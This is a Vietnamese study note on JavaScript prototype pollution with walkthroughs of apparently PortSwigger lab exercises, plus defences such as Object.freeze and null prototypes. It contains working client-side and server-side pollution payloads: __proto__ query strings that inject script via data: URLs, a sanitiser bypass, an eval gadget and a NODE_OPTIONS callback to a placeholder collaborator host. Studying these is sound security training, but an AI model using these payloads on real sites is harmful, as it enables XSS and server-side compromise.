# Prototype Pollution

Trong JavaScript, khái niệm "class" không tồn tại ở cấp độ ngôn ngữ ban đầu như trong các ngôn ngữ lập trình hướng đối tượng truyền thống (Java, C++, C#). Điều này là do JavaScript được thiết kế ban đầu như một ngôn ngữ dựa trên prototype chứ không phải class-based.

- Tuy nhiên, từ ECMAScript 6 (ES6), JavaScript đã giới thiệu từ khóa class để giúp lập trình viên mô tả các đối tượng theo phong cách hướng đối tượng gần giống với các ngôn ngữ khác

`Class-Based` ≠ `Prototype-Based`

- `Class-Based (Java, C++)`: Lập trình viên định nghĩa class trước, sau đó tạo các đối tượng (instances) từ class.
- `Prototype-Based (JavaScript)`: Không cần định nghĩa trước class. Đối tượng được tạo ra trực tiếp từ prototype hoặc từ các đối tượng khác.

Sau đó tôi nhận ra rằng localStorage/sessionStorage cũng sẽ kế thừa từ Object.prototype, điều đó có nghĩa là nếu một trang web có lỗ hổng ô nhiễm nguyên mẫu phía máy khách và trang web đó sử dụng phương thức lấy dữ liệu chứ không phải get()phương thức thì có thể kiểm soát giá trị localStorage.

Biến môi trường NODE_OPTIONS cho phép xác định một chuỗi các đối số dòng lệnh sẽ được sử dụng theo mặc định bất cứ khi nào bắt đầu một trình Node mới.

```javascript!
"__proto__": {
    "shell":"node",
    "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
}
```

## Khái niệm & Khai thác & Phòng tránh

### Object trong JavaScript

- Trong JavaScript, đối tượng (object) là một thực thể bao gồm thuộc tính (properties) và phương thức (methods) liên quan đến nó, cấu tạo có dạng key:value.

```javascript!
var person = {
    name: "John",
    age: 25,
    introduce: function () {
        console.log("Xin chào, tôi là " + this.name + " và tôi " + this.age + " tuổi.");
    }
};
```

- Trong ví dụ trên, đối tượng person có các thuộc tính name và age, phương thức introduce. Đối tượng này được khởi tạo theo cú pháp object literal. Ngoài ra có thể sử dụng constructor function:

```javascript!
browser APIsfunction Person(name, age) {
    this.name = name;
    this.age = age;
    this.introduce = function () {
        console.log("Xin chào, tôi là " + this.name + " và tôi " + this.age + " tuổi.");
    };
}

var person = new Person("John", 25);
```

Một object có thể được khởi tạo dựa trên class này thông qua từ khóa new. Bởi vậy có thể coi class là một dạng template (bản mẫu) của object. Tương tự, class cũng có template của nó, chính là prototype (nguyên mẫu). Có thể truy cập qua hai cách:

Gọi từ class: Foo.prototype

### `.prototype`:

- Một thuộc tính của hàm constructor.
- Được dùng để định nghĩa các phương thức và thuộc tính mà các đối tượng được tạo ra từ constructor đó sẽ kế thừa.
- Không phải đối tượng nào cũng có .prototype. Thuộc tính này chỉ tồn tại ở hàm (function).

vd:

```javascript!
function Person(name) {
  this.name = name;
}

// Thêm phương thức vào prototype của Person
Person.prototype.sayHello = function() {
  return `Hello, my name is ${this.name}`;
};

// Tạo đối tượng từ constructor
const cuong = new Person("Cuong");
console.log(cuong.sayHello()); // "Hello, my name is Cuong"

// Kiểm tra chuỗi prototype
console.log(Person.prototype === cuong.__proto__); // true
```

- `.prototype` là khuôn mẫu mà các đối tượng mới kế thừa.
- Tất cả các đối tượng được tạo từ new `Constructor()` sẽ có `.__proto__` trỏ đến `Constructor.prototype.`

### `.__proto__`

- Một thuộc tính của một đối tượng cụ thể.
- Trỏ đến prototype của constructor đã tạo ra đối tượng đó.
- Mọi đối tượng đều có thuộc tính .**proto**, kể cả những đối tượng không được tạo từ một constructor.

```javascript!
const cuong = new Person("Cuong");

// Kiểm tra chuỗi prototype
console.log(cuong.__proto__ === Person.prototype); // true
```

```javascript!
const obj = { a: 1 };
console.log(obj.__proto__ === Object.prototype); // true
```

- cũng có thể thay đổi prototype của một đối tượng:

```javascript!
const newProto = { sayHi() { return "Hi!"; } };
obj.__proto__ = newProto;

console.log(obj.sayHi()); // "Hi!"
```

| Thuộc tính       | `.prototype`                                 | `.__proto__`                               |
| ---------------- | -------------------------------------------- | ------------------------------------------ |
| Là của ai?       | Thuộc tính của constructor function          | Thuộc tính của mọi đối tượng               |
| Vai trò          | Định nghĩa các phương thức cho đối tượng     | Trỏ đến prototype mà đối tượng kế thừa     |
| Thay đổi được?   | Có thể thay đổi                              | Có thể thay đổi (không nên lạm dụng)       |
| Sử dụng khi nào? | Khi định nghĩa phương thức cho đối tượng mới | Khi kiểm tra hoặc truy cập chuỗi prototype |

Điểm quan trọng cần nhớ:

- `.__proto__` của một đối tượng luôn trỏ đến .prototype của constructor đã tạo ra đối tượng đó.
- `.prototype` chỉ tồn tại ở hàm constructor, còn `.__proto__` có ở mọi đối tượng.

- `objectLiteral` với `__proto__`:

```javascript!
const objectLiteral = { __proto__: { evilProperty: 'payload' } };
```

- Khi khai báo một đối tượng bằng cách sử dụng cú pháp object literal `{}` và gán giá trị cho thuộc tính `__proto__`, JavaScript không coi `__proto__` là một thuộc tính bình thường. Thay vào đó, nó sử dụng `__proto__` để thiết lập prototype của đối tượng.

```javascript!
objectLiteral.hasOwnProperty('__proto__'); // false
```

- `objectFromJson` với `__proto__`:

```javascript!
const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');
```

Khi sử dụng JSON.parse, JavaScript không xử lý đặc biệt thuộc tính **proto**. Thay vào đó, nó coi **proto** chỉ là một thuộc tính thông thường trong JSON và thêm nó vào đối tượng kết quả.

```javascript!
objectFromJson.hasOwnProperty('__proto__'); // true
```

Dưới đây là một ví dụ minh họa chi tiết quá trình JavaScript tìm kiếm thuộc tính hoặc phương thức khi gọi dog.speak():

VD:

```javascript!
// Hàm khởi tạo Animal
function Animal(name) {
    this.name = name;
}

// Thêm phương thức speak vào Animal.prototype
Animal.prototype.speak = function () {
    console.log(`${this.name} makes a noise.`);
};

// Tạo một đối tượng mới từ Animal
const dog = new Animal("Dog");

// Gọi phương thức speak từ dog
dog.speak(); // Dog makes a noise

// Thêm thuộc tính mới trực tiếp vào đối tượng dog
dog.speak = function () {
    console.log(`${this.name} barks!`);
};

// Gọi lại phương thức speak sau khi ghi đè
dog.speak(); // Dog barks!
```

- Khi gọi `dog.speak()`, JavaScript kiểm tra trực tiếp đối tượng dog. Nếu không tìm thấy phương thức, nó sẽ tìm trong chuỗi prototype (`dog.__proto__`, tức là Animal.prototype). Sau khi ghi đè `dog.speak`, JavaScript sử dụng phương thức trực tiếp trên dog mà không tra cứu trong `Animal.prototype`.

| Vị trí Tìm Kiếm         | Kết Quả Trước Ghi Đè        | Kết Quả Sau Ghi Đè     |
| ----------------------- | --------------------------- | ---------------------- |
| `dog.speak (trực tiếp)` | Không tìm thấy              | Tìm thấy (ghi đè mới)  |
| `dog.proto.speak`       | Tìm thấy (Animal.prototype) | Không cần tìm (bỏ qua) |

### khai thác

- cần hàm assign() và merge() để có thể gán objject thì mới trigger được Prototype Pollution => Tuy nhiên, trong thực tế, các ứng dụng dễ bị lỗ hổng này thường ngầm sử dụng các thao tác đó, ví dụ:

  - Object.assign: Thường được dùng để sao chép hoặc gộp các đối tượng.
  - merge: Thường xuất hiện trong các thư viện phổ biến như lodash (các phiên bản cũ) hoặc deepmerge.

- Prototype Pollution xảy ra trên URL như `https://vulnerable-website.com/?__proto__[evilProperty]=payload` vì trong nhiều ứng dụng web, các tham số URL được chuyển trực tiếp vào một đối tượng JavaScript (ví dụ: req.query trong Express.js). Nếu không có kiểm tra hoặc xử lý phù hợp, tham số `__proto__` có thể được chuyển thành một thuộc tính có khả năng thay đổi chuỗi prototype (prototype chain).

### cách thức hoạt động

![image](https://hackmd.io/_uploads/rk9mhEX4yl.png)

- Có thể sử dụng console của trình duyệt để xem hành vi của đối tượng:

![image](https://hackmd.io/_uploads/rJbS3NXNJl.png)

=> có thể thấy Object này kế thừa rất nhiều thuộc tính và phương thức tích hợp sẵn của Object.prototype

prototype chain:

![image](https://hackmd.io/_uploads/Hy72RVmN1l.png)

- Hầu hết mọi thứ trong JS đều là Object. Kế thừa đệ quy.

- Từ ví dụ trên, ta có thể truy cập nguyên mẫu của Object bằng `__proto__`:

```javascript!
username.__proto__                        // String.prototype
username.__proto__.__proto__              // Object.prototype
username.__proto__.__proto__.__proto__    // null
```

### `response.json()` (clientside) gây Prototype Pollution còn `JSON.parser()` (serverside) thì không

- Khi bạn sử dụng response.json() trong Fetch API, phương thức này chuyển đổi dữ liệu JSON trả về từ một HTTP response thành một đối tượng JavaScript. Nếu dữ liệu JSON chứa các thuộc tính như `__proto__`, Prototype Pollution có thể xảy ra.
  - Prototype Pollution qua response.json(): Khi bạn gọi response.json(), nếu dữ liệu JSON chứa các tham số như **proto**, thì chúng sẽ không bị loại bỏ hoặc kiểm tra mà sẽ được chuyển trực tiếp vào đối tượng. Kết quả là các thuộc tính này có thể thay đổi prototype của đối tượng, gây ra Prototype Pollution.

```javascript!
fetch('/my-products.json', { method: "GET" })
  .then((response) => response.json()) // response.json() không kiểm tra __proto__
  .then((data) => {
    console.log(data);
  });
```

Nếu kẻ tấn công gửi một yêu cầu như:

```javascript
?__proto__[x-username]=<img src="..." onerror="alert(1)">
```

- Mặc dù `JSON.parse()` có thể phân tích dữ liệu từ một chuỗi JSON, nhưng nó không tự động xử lý các thuộc tính đặc biệt như `__proto__`. Tuy nhiên, `JSON.parse()` sẽ không gây ra Prototype Pollution trực tiếp từ chính việc phân tích JSON nếu chuỗi JSON không có các thuộc tính nguy hiểm này.
  - JSON.parse() chỉ chuyển đổi chuỗi JSON thành một đối tượng JavaScript.
  - Khi bạn gọi JSON.parse('{"**proto**": {"polluted": "yes"}}'), nó tạo ra một đối tượng mới có thuộc tính **proto** giống như bất kỳ thuộc tính nào khác.
  - Thuộc tính **proto** chỉ trở thành một vấn đề nếu bạn gán nó vào một đối tượng khác (ví dụ: thông qua `Object.assign()` hoặc `Object.merge()`) hoặc sử dụng nó trong các cách khác mà thay đổi prototype chain.
- Trường hợp không gây prototype pollution:

```javascript!
const parsed = JSON.parse('{"__proto__": {"polluted": "yes"}}');

// Đối tượng parsed có thuộc tính __proto__, nhưng nó không thay đổi prototype chain
console.log(parsed.__proto__); // {constructor: ƒ, ...} (bình thường)
console.log(parsed.polluted); // undefined
console.log(Object.prototype.polluted); // undefined
```

- Nếu kiểm tra bằng cách thử tại tất cả điểm input của ứng dụng sẽ cần rất nhiều trường hợp và tốn lượng thời gian lớn. Có thể sử dụng một phương pháp kiểm tra đơn giản hơn như sau:

Bước 1: Thêm các phần tử prototype dưới dạng tham số trong URL. Ví dụ:

```javascript!
vulnerable-website.com/?__proto__[foo]=bar
vulnerable-website.com/?__proto__.foo=bar
vulnerable-website.com/?constructor[prototype][foo]=bar
vulnerable-website.com/?constructor.prototype.foo=bar
```

Bước 2: Sử dụng Console Tool trong bộ công cụ Dev Tools, kiểm tra giá trị Object.prototype.foo. Nếu giá trị trả về là bar cũng đồng nghĩa với việc trang web chứa lỗ hổng, nếu trả về undefined tức tấn công chưa thành công.

- Lặp lại 2 bước trên tại các đường dẫn khác nhau của trang web.
- Khi phát hiện ứng dụng chứa lỗ hổng, một trong những hướng tấn công phổ biến là thực hiện chèn payload để khai thác lỗ hổng XSS, thông thường bằng cách phân tích và tìm kiếm các tham số thuộc tính có thể được tận dụng trong các tệp `.js` của ứng dụng. Trong đó, chú ý các đoạn chương trình sử dụng các hàm, chức năng tiềm ẩn nguy cơ bị tấn công XSS như `innerHTML` hoặc `eval()`.

### Phòng tránh

- Giới hạn property keys cho phép trong whitelist
- "Đóng băng" nguyên mẫu (Prototype Freezing) `Object.freeze()`
  - có thể gọi phương thức Object.freeze() nhằm "đóng băng" đối tượng, khiến thuộc tính và giá trị của nó không thể bị thay đổi nữa, cũng không thể thêm mới thuộc tính nào.
  - Sử dụng đối tượng Set / Map

### DOM invader

- https://www.youtube.com/watch?v=GeqVMOUugqY

#### Ngăn chặn kế thừa thuộc tính bằng Null prototype

- Tất nhiên, không phải trong trường hợp nào các đối tượng kiểu Set hoặc Map cũng có thể đáp ứng được nhu cầu của ứng dụng. Nhiều trường hợp chúng ta bắt buộc phải khởi tạo và sử dụng các đối tượng thông thường trong chương trình. Đồng nghĩa với việc tính kế thừa prototype là bắt buộc (Tính chất của ngôn ngữ không thể thay đổi được).

- Lúc này, chúng ta có thể ngăn chặn bằng cách tác động vào đối tượng sẽ được thực hiện kế thừa: Không cho phép kế thừa thuộc tính từ Object prototype - sử dụng Null prototype.

```javascript
let myObject = Object.create(null);
Object.getPrototypeOf(myObject); // null
```

Lúc này, đối tượng myObject sẽ không kế thừa bất kỳ thuộc tính từ Object prototype. Dễ dàng kiểm tra với đoạn code:

![image](https://hackmd.io/_uploads/S1e9NwrVke.png)

## 1. Lab: Client-side prototype pollution via

### Đề bài

![image](https://hackmd.io/_uploads/r1AqhqGNke.png)

### Phân tích

- Phòng thí nghiệm này dễ bị DOM XSS thông qua ô nhiễm nguyên mẫu phía máy khách. Các nhà phát triển trang web đã nhận thấy một tiện ích tiềm năng và cố gắng vá nó. Tuy nhiên, bạn có thể bỏ qua các biện pháp họ đã thực hiện.

Để giải bài toán này:

- Tìm nguồn mà bạn có thể sử dụng để thêm các thuộc tính tùy ý vào toàn cục Object.prototype.
- Xác định thuộc tính tiện ích cho phép bạn thực thi JavaScript tùy ý.
- Kết hợp những điều này để gọi alert().

Bạn có thể giải bài tập này theo cách thủ công trên trình duyệt hoặc sử dụng DOM Invader để được trợ giúp.

Phòng thí nghiệm này dựa trên các lỗ hổng thực tế được PortSwigger Research phát hiện. Để biết thêm chi tiết, hãy xem Tiện ích ô nhiễm nguyên mẫu rộng rãi của Gareth Heyes .

- đọc source code thấy đoạn mã dễ bị tấn công tại `depram.js`

```javascript!
key = keys[i] === '' ? cur.length : keys[i];
cur = cur[key] = i < keys_last
    ? cur[key] || (keys[i+1] && isNaN(keys[i+1]) ? {} : [])
    : val;
```

mục đích:

- Chuỗi query string như `a[b][c]=value` sẽ ánh xạ thành:

```javascript!
obj = {
  a: {
    b: {
      c: "value"
    }
  }
};
```

- Khi key lấy giá trị từ chuỗi query string mà không kiểm tra tính hợp lệ, attacker có thể gửi key đặc biệt như **proto**. Trong JavaScript, **proto** là một thuộc tính quan trọng tồn tại trên tất cả các đối tượng. Bằng cách gán giá trị cho **proto**, attacker có thể sửa đổi prototype của mọi đối tượng.

VD:

```javascript!
?__proto__[polluted]=true
```

Khi được xử lý bởi đoạn mã trên:

- keys = ["__proto__", "polluted"]

Ở lần đầu:

```javascript!
key = "__proto__";
cur = obj;
cur = cur[key] = {}; // cur trỏ đến Object.prototype
```

- Kết quả: cur giờ trỏ đến prototype của tất cả các đối tượng.

- Ở lần thứ hai

```javascript!
key = "polluted";
cur = cur[key] = val; // cur[key] giờ là Object.prototype.polluted
```

- Prototype bị sửa đổi với polluted: true.

```javascript!
console.log({}.polluted); // true
```

- Gán trực tiếp đối tượng với key `__proto__`: Khi bạn trực tiếp gán một đối tượng có key `__proto__`, JavaScript sẽ hiểu rằng bạn muốn thay đổi prototype của đối tượng đó, vì `__proto__` là một thuộc tính đặc biệt của đối tượng, không phải thuộc tính bình thường. Điều này dẫn đến prototype pollution.

### Khai thác

1. Tìm nguồn ô nhiễm nguyên mẫu (prototype pollution source)

- hãy thử gây ô nhiễm `Object.prototype` bằng cách đưa một thuộc tính tùy ý thông qua chuỗi truy vấn:

```javascript!
/?__proto__[foo]=bar
```

![image](https://hackmd.io/_uploads/HJF5MJV4yg.png)

- Nghiên cứu các thuộc tính của đối tượng được trả về và quan sát thuộc tính foo đã được thêm vào
- đã tìm thấy thành công một nguồn ô nhiễm nguyên mẫu.

![image](https://hackmd.io/_uploads/HJHAmy44ye.png)

2. xác định một gadget

- Trong bảng DevTools của trình duyệt, hãy chuyển đến tab Nguồn .
- Nghiên cứu các tệp JavaScript được trang web mục tiêu tải và tìm bất kỳ lỗ hổng DOM XSS nào.

Trong `searchLoggerConfigurable.js`, hãy lưu ý rằng nếu configđối tượng có thuộc tính `transport_url`, thuộc tính này được sử dụng để thêm động một tập lệnh vào DOM.

![image](https://hackmd.io/_uploads/rJlkXJEN1x.png)

```javascript!
async function logQuery(url, params) {
    try {
        await fetch(url, {method: "post", keepalive: true, body: JSON.stringify(params)});
    } catch(e) {
        console.error("Failed storing query");
    }
}

async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString()), transport_url: false};
    Object.defineProperty(config, 'transport_url', {configurable: false, writable: false});
    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}

window.addEventListener("load", searchLogger);
```

- Lưu ý rằng một `transport_url` thuộc tính được định nghĩa cho `config` đối tượng

```javascript
Object.defineProperty(config, "transport_url", {
  configurable: false,
  writable: false,
});
```

- sẽ thêm hoặc cập nhật thuộc tính `transport_url` của đối tượng config. Nếu thuộc tính này chưa tồn tại, nó sẽ được tạo ra, và nếu đã tồn tại, các giá trị cấu hình hiện tại của thuộc tính sẽ được thay đổi. Khi không cấu hình cụ thể thêm bất kỳ tham số nào khác trong descriptor (đối tượng thứ ba của defineProperty), các giá trị mặc định của thuộc tính đó sẽ được áp dụng.

- Nếu bạn không chỉ định các thuộc tính trong descriptor, các giá trị mặc định sẽ được dùng:

| Thuộc tính   | Mặc định  | Ý nghĩa                                                                                                         |
| ------------ | --------- | --------------------------------------------------------------------------------------------------------------- |
| configurable | false     | Không thể thay đổi hoặc xóa thuộc tính sau khi nó đã được định nghĩa.                                           |
| writable     | false     | Giá trị của thuộc tính không thể được sửa đổi.                                                                  |
| enumerable   | false     | Thuộc tính sẽ không hiển thị khi duyệt qua đối tượng (vd: for...in, Object.keys, hoặc JSON.stringify).          |
| value        | undefined | nếu chưa gán Giá trị hiện tại của thuộc tính. Nếu không chỉ định value, giá trị của thuộc tính sẽ là undefined. |
| get          | undefined | Nếu không được chỉ định, thuộc tính không có getter.                                                            |
| set          | undefined | Nếu không được chỉ định, thuộc tính không có setter.                                                            |

- Vì giá trị ban đầu của `transport_url` là false và không thể thay đổi, khối lệnh trong if sẽ không bao giờ được thực thi.
- sử dụng payload sau để thay đổi giá trị của `transport_url`:

```javascript
/?__proto__[value]=foo
```

- Quan sát thấy một `<script>` phần tử đã được hiển thị trên trang, với `src` thuộc tính `foo`

![image](https://hackmd.io/_uploads/rJlfKy4Nke.png)

![image](https://hackmd.io/_uploads/SJA-21NNyx.png)

- để khai thác XSS dùng payload sau:

```javascript!
/?__proto__[value]=data:,alert(1);
```

![image](https://hackmd.io/_uploads/BkoIny4E1g.png)

### DOM Invader

- Enable DOM Invader và enable the prototype pollution option.

- Mở bảng DevTools của trình duyệt, đi tới tab DOM Invader , sau đó tải lại trang.

- Lưu ý rằng DOM Invader đã xác định hai vectơ ô nhiễm nguyên mẫu trong thuộc tính search, tức là chuỗi truy vấn.

![image](https://hackmd.io/_uploads/rkkm-jzNkx.png)

- Nhấp vào `Scan for gadgets` . Một tab mới sẽ mở ra, trong đó DOM Invader bắt đầu quét tiện ích bằng nguồn đã chọn.

![image](https://hackmd.io/_uploads/ByxyXsGNJx.png)

![image](https://hackmd.io/_uploads/SJegQjGNkl.png)

![image](https://hackmd.io/_uploads/r1h17sGEye.png)

- Lưu ý rằng DOM Invader đã truy cập thành công vào bộ nhớ đệm `script.src` thông qua tiện ích ``value```.

![image](https://hackmd.io/_uploads/HkQ-XjM4Jl.png)

- Nhấp vào Exploit . DOM Invader sẽ tự động tạo một bản khai thác bằng chứng khái niệm và gọi alert(1).

![image](https://hackmd.io/_uploads/S1ib7jMVJe.png)

![image](https://hackmd.io/_uploads/HkZMmoGE1g.png)

## 2. Lab: DOM XSS via client-side prototype pollution

### Đề bài

![image](https://hackmd.io/_uploads/H1mLOO44ke.png)

### Phân tích

Phòng thí nghiệm này dễ bị DOM XSS tấn công thông qua ô nhiễm nguyên mẫu phía máy khách. Để giải quyết phòng thí nghiệm:

- Tìm nguồn mà bạn có thể sử dụng để thêm các thuộc tính tùy ý vào toàn cục Object.prototype.

- Xác định thuộc tính tiện ích cho phép bạn thực thi JavaScript tùy ý.

- Kết hợp những điều này để gọi alert().

Bạn có thể giải bài tập này theo cách thủ công trên trình duyệt hoặc sử dụng DOM Invader để được trợ giúp.

### Khai thác

- tương tự bài trước dùng payload sua để kiểm tra lỗi

```javascript
/?__proto__[foo]=bar
```

![image](https://hackmd.io/_uploads/HyfsKdE4Jx.png)

- thấy trigger được prototype
- tương tự bài trước chúng ta đi tìm DOM XSS để trỉgger

![image](https://hackmd.io/_uploads/SkTg5d4Ekl.png)

```javascript
async function logQuery(url, params) {
  try {
    await fetch(url, {
      method: "post",
      keepalive: true,
      body: JSON.stringify(params),
    });
  } catch (e) {
    console.error("Failed storing query");
  }
}

async function searchLogger() {
  let config = { params: deparam(new URL(location).searchParams.toString()) };

  if (config.transport_url) {
    let script = document.createElement("script");
    script.src = config.transport_url;
    document.body.appendChild(script);
  }

  if (config.params && config.params.search) {
    await logQuery("/logger", config.params);
  }
}

window.addEventListener("load", searchLogger);
```

- nếu `config.transport_url` được set giá trị thì chúng ta sẽ trigger được

- Lưu ý rằng không có transport_url thuộc tính nào được xác định cho configđối tượng. Đây là một tiện ích tiềm năng để kiểm soát src.

```javascript
/?__proto__[transport_url]=foo
```

- Quan sát thấy một `<script>` phần tử đã được hiển thị trên trang, với srcthuộc tính foo

![image](https://hackmd.io/_uploads/Syvmi_44yx.png)

- mình dùng payload sau và solve được lab

```javascript
/?__proto__[transport_url]=data:,alert(1);
```

![image](https://hackmd.io/_uploads/rygcjd4N1g.png)

### DOM Invader

![image](https://hackmd.io/_uploads/SJQW3d4Vyx.png)

![image](https://hackmd.io/_uploads/BylMhuENkl.png)

![image](https://hackmd.io/_uploads/HJ6Mn_N41g.png)

- nhấn exploit và trigger thành công

![image](https://hackmd.io/_uploads/r1-Qn_E41e.png)

## 3.Lab: DOM XSS via an alternative prototype pollution vector

### Đề bài

![image](https://hackmd.io/_uploads/BJMA3Wr4kg.png)

### Khai thác

- tương tự bài trên trigger prototype pollution với payload

```javascript!
?__proto__[foo]=bar
```

- không thành công

![image](https://hackmd.io/_uploads/BJaop-r4ke.png)

- với `?__proto__.foo=bar` có thể trigger đc lỗi:

![image](https://hackmd.io/_uploads/rJUbRbB41x.png)

```javascript
   // recursive function to construct the result object
        function createElement(params, key, value) {
            key = key + '';
            // if the key is a property
            if (key.indexOf('.') !== -1) {
                // extract the first part with the name of the object
                var list = key.split('.');
                // the rest of the key
                var new_key = key.split(/\.(.+)?/)[1];
                // create the object if it doesnt exist
                if (!params[list[0]]) params[list[0]] = {};
                // if the key is not empty, create it in the object
                if (new_key !== '') {
                    createElement(params[list[0]], new_key, value);
                } else console.warn('parseParams :: empty property in key "' + key + '"');
            } else


```

- để ý trong hàm sử lý search có dùng hàm eval():

```javascript
async function searchLogger() {
  window.macros = {};
  window.manager = {
    params: $.parseParams(new URL(location)),
    macro(property) {
      if (window.macros.hasOwnProperty(property)) return macros[property];
    },
  };
  let a = manager.sequence || 1;
  manager.sequence = a + 1;

  eval(
    "if(manager && manager.sequence){ manager.macro(" + manager.sequence + ") }"
  );

  if (manager.params && manager.params.search) {
    await logQuery("/logger", manager.params);
  }
}
```

- phương thức macro() nhận vào 1 tham số đầu vào và return ra giá trị của tham số đó đó nếu nó là thuộc tính của macro
- và nó được gọi trong eval với tham số đầu vào là thuộc tính `sequence` của manager và chúng ta có thể kiểm soát bằng prototype
- dùng payload sau để set giá trị cho sequence và solved lab

```javascript
manager.sequence = a + 1;
```

- vì sequence được nối chuỗi với 1 nên chúng ta cần ngắt nó và để javascript thực thi alert()

```javascript
/?__proto__.sequence=alert(1)-
```

![image](https://hackmd.io/_uploads/r1UdfGBNye.png)

![image](https://hackmd.io/_uploads/rJb2zGBEkg.png)

![image](https://hackmd.io/_uploads/SkTeMfSEJl.png)

## 4.Lab: Client-side prototype pollution via flawed sanitization

### Đề bài

![image](https://hackmd.io/_uploads/BkF07MSVJl.png)

### Phân tích

```javascript
async function searchLogger() {
  let config = { params: deparam(new URL(location).searchParams.toString()) };
  if (config.transport_url) {
    let script = document.createElement("script");
    script.src = config.transport_url;
    document.body.appendChild(script);
  }
  if (config.params && config.params.search) {
    await logQuery("/logger", config.params);
  }
}

function sanitizeKey(key) {
  let badProperties = ["constructor", "__proto__", "prototype"];
  for (let badProperty of badProperties) {
    key = key.replaceAll(badProperty, "");
  }
  return key;
}
```

- lab đã có thêm hàm chặn `'constructor','__proto__','prototype'` và mình cần bypass nó
- Tuy nhiên, do hàm replaceAll() chỉ loại bỏ duy nhất 1 lần từ khóa được yêu cầu. Nên có thể dễ dàng bypass bằng cách "double" từ khóa, ví dụ:

### Khai thác

- dùng payload sau và trigger thành công :

```javascript
?__pro__proto__to__[foo]=bar
```

![image](https://hackmd.io/_uploads/rJFsVzrV1x.png)

- khaii thác XSS với payload

```
__pro__proto__to__[transport_url]=data:,alert(1);
```

![image](https://hackmd.io/_uploads/Hk2rIzHVJe.png)

### Invader

![image](https://hackmd.io/_uploads/BJLuHMrE1g.png)

- nó chỉ phát hiện prototype chứ chưa khai thác đc XSS

![image](https://hackmd.io/_uploads/ByHFSfSV1g.png)

## 5.Lab: Client-side prototype pollution in third-party libraries

### Đề bài

![image](https://hackmd.io/_uploads/Hy6jUGBVkx.png)

### Phân tích

### Khai thác

![image](https://hackmd.io/_uploads/B16zPzS4Jl.png)

![image](https://hackmd.io/_uploads/ByQNDMr4yg.png)

![image](https://hackmd.io/_uploads/rJtSPfHE1x.png)

![image](https://hackmd.io/_uploads/BkmLwMS4Jx.png)

![image](https://hackmd.io/_uploads/HyTC_fS4Jx.png)

![image](https://hackmd.io/_uploads/HJ9dYGBEkx.png)

## 6.Lab: Privilege escalation via server-side prototype pollution

### Đề bài

![image](https://hackmd.io/_uploads/HkrFM7SVkg.png)

### Phân tích

Phòng thí nghiệm này được xây dựng trên Node.js và framework Express. Nó dễ bị ô nhiễm nguyên mẫu phía máy chủ vì nó hợp nhất không an toàn dữ liệu đầu vào do người dùng kiểm soát vào đối tượng JavaScript phía máy chủ. Điều này dễ phát hiện vì bất kỳ thuộc tính ô nhiễm nào được kế thừa qua chuỗi nguyên mẫu đều có thể nhìn thấy trong phản hồi HTTP.

Để giải bài toán này:

- Tìm một nguồn ô nhiễm nguyên mẫu mà bạn có thể sử dụng để thêm các thuộc tính tùy ý vào toàn cục Object.prototype.
- Xác định thuộc tính tiện ích mà bạn có thể sử dụng để nâng cao quyền hạn của mình.
- Truy cập bảng quản trị và xóa người dùng `carlos`.
- Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin đăng nhập sau: `wiener:peter`

- ví dụ về prototype phía serverr:

```javascript
const testObject = { a: 1, b: 2 };
for (propertyKey in testObject) {
  console.log(propertyKey);
}
// Output: a b
```

- Điều đặc biệt là vòng lặp này sẽ liệt kê cả các thuộc tính mà đối tượng kế thừa từ nguyên mẫu (đối tượng không chứa thuộc tính đó). Thật vậy, bổ xung thuộc tính test vào Object.prototype:

```javascript
const testObject = { a: 1, b: 2 };
Object.prototype.test = "3";
for (propertyKey in testObject) {
  console.log(propertyKey);
}
```

Kết quả:

![image](https://hackmd.io/_uploads/HkmKv7HEJx.png)

Ví dụ trong 1 chương trình:

```javascript
function getUserData(data) {
  const userData = {};
  for (const key in data) {
    console.log(key);
    userData[key] = data[key];
  }
  return userData;
}

// ...

// Reflect the data in the response
res.json({
  Message: "Profile updated successfully",
  UserData: getUserData(dataProfile),
});
```

### Khai thác

- Ứng dụng gửi dữ liệu tới server bằng JSON và response hiển thị các thông tin của người dùng wiener. Chúng ta có thể thêm tùy ý cặp key:value

![image](https://hackmd.io/_uploads/SJM1KQB4ke.png)

![image](https://hackmd.io/_uploads/By3rFXSV1e.png)

![image](https://hackmd.io/_uploads/ryoLKmH4yl.png)

![image](https://hackmd.io/_uploads/r1rwY7SN1l.png)

Như vậy, khi sử dụng cấu trúc for...in trong các chức năng hiển thị thuộc tính đối tượng, chúng ta nên thêm một bước kiểm tra đối tượng có thuộc tính đang xét không data.hasOwnProperty(key) nhằm tránh việc ứng dụng hiển thị các thuộc tính kế thừa từ prototype. Ví dụ:

```javascript
function getUserData(data) {
  const userData = {};
  for (const key in data) {
    if (data.hasOwnProperty(key)) {
      userData[key] = data[key];
    }
  }
  return userData;
}
```

## 7.Lab: Detecting server-side prototype pollution without polluted property reflection

### Đề bài

![image](https://hackmd.io/_uploads/S1e0tmBEyg.png)

### Phân tích

Phòng thí nghiệm này được xây dựng trên Node.js và khung Express. Nó dễ bị ô nhiễm nguyên mẫu phía máy chủ vì nó kết hợp không an toàn dữ liệu đầu vào do người dùng kiểm soát vào đối tượng JavaScript phía máy chủ.

Để giải quyết phòng thí nghiệm, hãy xác nhận lỗ hổng bằng cách gây ô nhiễm Object.prototypetheo cách kích hoạt thay đổi đáng chú ý nhưng không phá hủy trong hành vi của máy chủ. Vì phòng thí nghiệm này được thiết kế để giúp bạn thực hành các kỹ thuật phát hiện không phá hủy, nên bạn không cần phải tiến tới khai thác.

Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin đăng nhập sau:`wiener:peter`

![image](https://hackmd.io/_uploads/r1A09mSNyg.png)

![image](https://hackmd.io/_uploads/Sk3QimSVJe.png)

### Khai thác

- Cố ý phá vỡ cú pháp JSON một lần nữa và gửi lại yêu cầu.

- Lưu ý rằng lần này, mặc dù bạn đã kích hoạt cùng một lỗi, các thuộc tính statusvà statusCodetrong phản hồi JSON khớp với mã lỗi tùy ý mà bạn đã đưa vào Object.prototype. Điều này cho thấy rõ ràng là bạn đã làm ô nhiễm thành công nguyên mẫu và phòng thí nghiệm đã được giải quyết.

![image](https://hackmd.io/_uploads/rkuan7HNJx.png)

![image](https://hackmd.io/_uploads/Bk7yTQrE1g.png)

